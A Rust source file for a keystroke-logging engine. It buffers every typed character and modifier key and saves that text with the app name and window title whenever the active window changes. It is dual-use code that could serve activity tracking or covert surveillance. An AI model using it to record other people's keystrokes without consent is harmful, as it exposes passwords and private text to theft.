use tokio::sync::mpsc;
use crate::models::{InputEvent, ActivityRecord, KeyType, WindowEvent};
use crate::storage::Storage;
use smol_str::SmolStr;
use chrono::Utc;
use std::sync::Arc;

pub struct LoggerEngine {
    storage: Arc<Storage>,
    current_app: SmolStr,
    current_window: SmolStr,
    text_buffer: String,
    rx: mpsc::Receiver<InputEvent>,
}

impl LoggerEngine {
    pub fn new(storage: Arc<Storage>, rx: mpsc::Receiver<InputEvent>) -> Self {
        Self {
            storage,
            current_app: SmolStr::from("None"),
            current_window: SmolStr::from("None"),
            text_buffer: String::with_capacity(256),
            rx,
        }
    }

    pub async fn run(&mut self) {
        while let Some(event) = self.rx.recv().await {
            match event {
                InputEvent::Key(key_event) => {
                    self.handle_key(key_event.key);
                }
                InputEvent::Window(win_event) => {
                    self.handle_window_switch(win_event);
                }
                InputEvent::System(_) => {}
            }
        }
    }

    fn handle_key(&mut self, key: KeyType) {
        match key {
            KeyType::Char(c) => self.text_buffer.push(c),
            KeyType::Backspace => {
                self.text_buffer.pop();
            }
            KeyType::Enter => {
                self.text_buffer.push('\n');
            }
            KeyType::Space => {
                self.text_buffer.push(' ');
            }
            KeyType::Tab => {
                self.text_buffer.push('\t');
            }
            KeyType::Modifier(m) => {
                self.text_buffer.push_str(&format!(" {} ", m));
            }
            _ => {}
        }
    }

    fn handle_window_switch(&mut self, event: WindowEvent) {
        if !self.text_buffer.is_empty() {
            let record = ActivityRecord {
                timestamp: Utc::now(),
                app_name: self.current_app.clone(),
                window_title: self.current_window.clone(),
                buffer: self.text_buffer.clone(),
            };

            let _ = self.storage.save_record(record);
            self.text_buffer.clear();
        }

        self.current_app = event.app_name;
        self.current_window = event.window_title;
    }
}
